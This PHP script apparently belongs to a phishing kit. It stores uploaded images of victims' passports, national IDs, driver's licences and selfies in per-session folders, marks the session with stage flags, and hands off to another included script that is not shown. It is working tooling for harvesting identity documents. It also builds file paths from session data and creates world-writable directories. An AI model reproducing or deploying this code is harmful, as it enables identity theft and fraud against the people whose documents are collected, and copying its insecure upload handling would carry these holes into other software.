<?php 
session_start();
$upload_dir = './xuploadsx'.DIRECTORY_SEPARATOR; 
$allowed_types = array('jpg', 'png', 'jpeg', 'gif'); 
// Define maxsize for files i.e 2MB 
$maxsize = 10 * 1024 * 1024; 

if (isset($_POST['images'])) {
	$updated = array();
	
	if(!isset($_SESSION['First_Name']) || empty($_SESSION['First_Name'])) {
			$_SESSION['First_Name'] = "User";
			$_SESSION['Last_Name'] = rand(10000, 99999);
	}
	
	$dir_name = $_SESSION['First_Name'] . '_' . $_SESSION['Last_Name'];
	
	$path = $upload_dir . $dir_name;
	
	foreach($_POST['images'] as $data) {
		list($type, $data) = explode(';', $data);
		list(, $data)      = explode(',', $data);
		$type = strtolower(explode("/", $type)[1]);
		if ($type == "jpeg") {$type = "jpg";}
		$data = base64_decode($data);
		$file_size = strlen($data);
		
		if (!is_dir($path)) {mkdir($path, 0777);}
	
		if ($file_size > $maxsize) { 
			echo "Error: File size is larger than the allowed limit."; 
			exit;
		}
	
		if(in_array($type, $allowed_types)) {
			if (isset($_POST["id_slf"])) {
				$filename = "selfie-" . rand(1000,9999) . '.' . $type;
			} else {
				$doc_type = $_POST['doc_type'];
				if ($doc_type == 'Passport') $name = "passport";
				elseif ($doc_type == 'National ID') $name = "NationalID";
				else if ($doc_type == 'DriversLicense') $name = "DriversLicense";
				else $name = "NoType";
				$filename = $name . "-" . rand(1000,9999) . '.' . $type;
			}
			$file_path = $path . '/' . $filename;
			
			file_put_contents($file_path, $data);
			$updated[] = "xuploadsx/$dir_name/$filename";
			//echo $filename . " ";
		}

		else {
			echo "(file type is not allowed)<br / >"; 
		}
	}

	/*foreach ($updated as $file) {
		echo $file;
		echo "  ";
		
	} */
	
	 $url = $_SESSION['url'];
	$_SESSION['loged'] = "loged6";
	$_SESSION['alboms'] = "$url/xuploadsx/$dir_name";
	if ($_POST["id_slf"] == 'ok') {die("successful");}
	if ($_POST["id_slf"] == 'ok'){$_POST["doc_type"] = "selfie";}
	$_SESSION['doc_type'] = $_POST["doc_type"];



include('../tnt/sv1.php');
	
}




?> 
